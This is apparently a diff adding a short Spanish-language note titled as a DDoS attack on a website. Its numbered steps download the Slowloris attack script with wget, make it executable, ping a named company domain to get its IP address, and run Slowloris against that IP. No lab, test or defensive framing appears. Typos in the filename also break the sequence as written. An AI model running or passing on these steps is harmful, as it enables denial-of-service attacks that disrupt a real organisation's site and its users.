@@ -1,0 +1,6 @@
+Ataque DDOS a tisio web
+
+1. wget http://ha.ckers.org/slowloris/slowloris.pl #Descargo slowloris
+2. chmod +x  sowloris.pl #le damos permijo para ejecucion
+3. ping corporacioncsf.com #107.180.2.25
+3. ./slowloris.pl -dns 107.180.2.25
